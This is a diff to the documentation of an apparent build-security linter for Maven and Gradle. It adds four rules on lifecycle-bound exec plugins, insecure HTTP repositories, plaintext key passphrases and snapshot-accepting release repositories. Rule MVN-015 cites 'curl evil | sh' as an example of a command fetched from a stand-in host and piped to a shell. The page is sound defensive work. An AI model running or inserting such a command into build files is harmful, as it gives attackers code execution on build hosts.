@@ -48,7 +48,7 @@ real-world POMs and out of scope for static analysis.
 
 ## What it covers
 
-14 checks · 0 have an autofix patch (``--fix``).
+18 checks · 0 have an autofix patch (``--fix``).
 
 | Check | Title | Severity | Fix |
 |-------|-------|----------|-----|
@@ -66,6 +66,10 @@ real-world POMs and out of scope for static analysis.
 | [MVN-012](#mvn-012) | pom.xml build plugin uses a floating version | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 | [MVN-013](#mvn-013) | pom.xml build extension uses a floating version | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 | [MVN-014](#mvn-014) | Maven Wrapper distributionUrl lacks distributionSha256Sum | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
+| [MVN-015](#mvn-015) | pom.xml binds a build-time code-execution plugin to the lifecycle | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [MVN-016](#mvn-016) | build.gradle re-enables HTTP via allowInsecureProtocol = true | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [MVN-017](#mvn-017) | settings.xml <server> ships a private key with an inline passphrase | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [MVN-018](#mvn-018) | distributionManagement release repository accepts SNAPSHOTs | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
 
 ---
 
@@ -503,6 +507,122 @@ Add a ``distributionSha256Sum`` entry to ``.mvn/wrapper/maven-wrapper.properties
 The hash is published at the distribution URL plus ``.sha256`` (or available from Apache's release manifest). The wrapper verifies the downloaded archive's hash before extracting; without the entry, the wrapper trusts whatever bytes the URL serves at download time — fine when the URL is the canonical Apache repo and the connection is HTTPS, but unrecoverable when an internal mirror is compromised or a network MITM intercepts the download.
 
 Modern ``mvn wrapper:wrapper`` invocations support a ``-Dtype=script`` mode that adds the hash automatically.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## MVN-015: pom.xml binds a build-time code-execution plugin to the lifecycle { #mvn-015 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
+</div>
+
+Re-parses ``pom.xml`` and walks ``<build><plugins><plugin>``, ``<build><pluginManagement>``, and ``<profile><build>`` plugins. Fires when a known command-running plugin (``exec-maven-plugin``, ``maven-antrun-plugin``, ``gmavenplus-plugin``, ``groovy-maven-plugin``, ``frontend-maven-plugin``) carries at least one ``<executions><execution>`` binding, which is what wires it into the build lifecycle so it runs automatically.
+
+Distinct from MVN-012, which only checks that a plugin's ``<version>`` is pinned. A plugin can be perfectly pinned and still execute ``curl evil | sh`` from its configuration; MVN-012 passes it, MVN-015 catches the lifecycle binding. Scoped to ``pom.xml`` (Gradle's equivalent ``exec`` / ``JavaExec`` tasks are a separate surface).
+
+**Known false-positive modes**
+
+- Lifecycle-bound code generation is common and often legitimate (``frontend-maven-plugin`` building a JS bundle, ``exec-maven-plugin`` running a checked-in generator). The rule flags the build-time-execution surface so a reviewer can confirm the command and its inputs are trusted and constant; suppress per pom with a rationale once verified.
+
+**Seen in the wild**
+
+- Build-time plugin execution is the dominant real-world Maven build-RCE primitive: a poisoned or misconfigured ``exec`` / ``antrun`` execution runs attacker-chosen commands on the build host. Same class as the npm lifecycle-script attacks and the xz-utils build-step backdoor, expressed through Maven's plugin lifecycle.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Review every lifecycle-bound execution of a command-running plugin (``exec-maven-plugin``, ``maven-antrun-plugin``, ``gmavenplus-plugin`` / ``groovy-maven-plugin``, ``frontend-maven-plugin``). When such a plugin has an ``<execution>`` tied to a phase, it runs arbitrary host commands on every ``mvn package`` / ``install`` / ``deploy``, with the build's privileges (CI runner write access, deploy keys, cloud credentials). Pinning the plugin version (MVN-012) does NOT remove this risk: a perfectly pinned ``exec-maven-plugin`` still runs whatever command its ``<configuration>`` names. Confirm the command and its inputs are trusted and constant (no downloaded script, no ``${}`` that an attacker can influence), move genuinely necessary code generation behind a reviewed, checked-in script, and drop any execution that isn't needed. Treat these executions as the build-RCE primitive they are.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## MVN-016: build.gradle re-enables HTTP via allowInsecureProtocol = true { #mvn-016 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-S-TRUSTED-REG</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-319</span>
+</div>
+
+Fires when a Gradle build script (``build.gradle`` / ``build.gradle.kts``) contains ``allowInsecureProtocol = true`` (the Groovy form) or ``isAllowInsecureProtocol = true`` (the Kotlin DSL property), the explicit opt-out Gradle 7+ requires to allow an ``http://`` repository.
+
+Complements MVN-003 (an ``http://`` repository URL). MVN-003 matches the literal URL; this rule catches the enabling flag, which fires even when the URL itself is a property the regex extractor can't resolve to a literal ``http://`` string.
+
+**Known false-positive modes**
+
+- A build that only ever resolves from a trusted internal mirror on an isolated network segment may set the flag deliberately. Suppress per line with a rationale naming the network boundary; the HTTPS / TLS-proxy path is strictly safer.
+
+**Seen in the wild**
+
+- Gradle made ``http://`` repositories opt-in (requiring ``allowInsecureProtocol``) in Gradle 7 specifically because unencrypted artifact resolution is a man-in-the-middle surface; re-enabling it reopens that surface for both dependencies and build-script plugins.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Remove ``allowInsecureProtocol = true`` and serve the repository over HTTPS. Gradle 7+ refuses to resolve dependencies from an ``http://`` repository unless the build explicitly opts back in with this flag, precisely because a plain-HTTP repo is a MITM surface: anyone on the network path between the build and the repo can substitute the artifacts Gradle downloads (and Gradle resolves build-script plugins the same way, so the swap can be build-time RCE). Point the ``maven { url ... }`` at an HTTPS endpoint; if the repo can't terminate TLS, front it with a TLS-terminating reverse proxy rather than disabling the protection.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## MVN-017: settings.xml <server> ships a private key with an inline passphrase { #mvn-017 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-10</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-798</span> <span class="pg-tag pg-tag--cwe">CWE-522</span>
+</div>
+
+Reads ``<settings><servers><server>`` entries and fires when a ``<server>`` declares a ``<privateKey>`` AND a ``<passphrase>`` that carries a plaintext value, anything that is not the Maven-encrypted ``{...}`` form, an ``${...}`` property / env expansion, or empty.
+
+The SSH / GPG-credential sibling of MVN-010 (a plaintext ``<password>``); it reuses the same encrypted-vs-``${}``-vs-plaintext discriminator. Lower frequency than ``<password>`` but higher blast radius: a leaked key + passphrase is a reusable deploy credential.
+
+**Known false-positive modes**
+
+- Local / sandbox settings.xml files used only against a throwaway key may carry a placeholder passphrase that looks like plaintext. Suppress per file with a rationale; a production settings.xml should never pair a real ``<privateKey>`` with a plaintext ``<passphrase>``.
+
+**Seen in the wild**
+
+- Same leak class as MVN-010: deploy credentials committed through settings.xml. A private key whose passphrase is stored next to it offers no protection once the file leaks, the passphrase is the only thing standing between a stolen key file and a working deploy credential.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Encrypt the ``<passphrase>`` or inject it at build time; never commit a private-key passphrase in plaintext alongside the key. The remediation mirrors MVN-010's password flow: run ``mvn --encrypt-password <passphrase>`` and paste the ``{...}`` token into ``<passphrase>``, with the master in ``~/.m2/settings-security.xml``; or use a property expansion (``${env.DEPLOY_KEY_PASSPHRASE}``) so the value lives in a CI secret, not on disk. A plaintext passphrase next to a ``<privateKey>`` path defeats the key passphrase entirely: anyone who reads the file (a repo clone, a CI cache, an archived backup) has both halves and can use the key to deploy. Prefer rotating to a CI-managed deploy credential over storing a long-lived key + passphrase in settings.xml at all.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--medium" markdown>
+
+## MVN-018: distributionManagement release repository accepts SNAPSHOTs { #mvn-018 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
+</div>
+
+Re-parses ``pom.xml`` and inspects the ``<distributionManagement><repository>`` element (the release deploy target, not the ``<snapshotRepository>``). Fires when that repository sets ``<snapshots><enabled>true``, which lets ``mvn deploy`` publish mutable ``-SNAPSHOT`` artifacts into the release repo.
+
+Scoped tightly to the snapshot-acceptance angle: the ``http://`` deploy-URL half of distributionManagement hygiene is already MVN-003's surface. This rule is about a release target that doesn't hold its release-only guarantee.
+
+**Known false-positive modes**
+
+- Internal repositories that intentionally serve both releases and snapshots from one URL (a single Nexus / Artifactory hosted repo) may enable snapshots on the release target by design. Suppress per pom with a rationale; the cleaner posture is a dedicated ``<snapshotRepository>``.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Keep the ``<distributionManagement><repository>`` (the release deployment target) snapshot-free, and route mutable ``-SNAPSHOT`` builds to a separate ``<snapshotRepository>``. When the release repository enables snapshots (``<snapshots><enabled>true``), mutable ``-SNAPSHOT`` artifacts land in the same place consumers treat as immutable releases, so a coordinate that looks like a pinned release can be silently re-published with different bytes. Set ``<releases><enabled>true`` + ``<snapshots><enabled>false`` on the release repository, and declare a distinct ``<snapshotRepository>`` for in-development builds.
 
 </div>
 
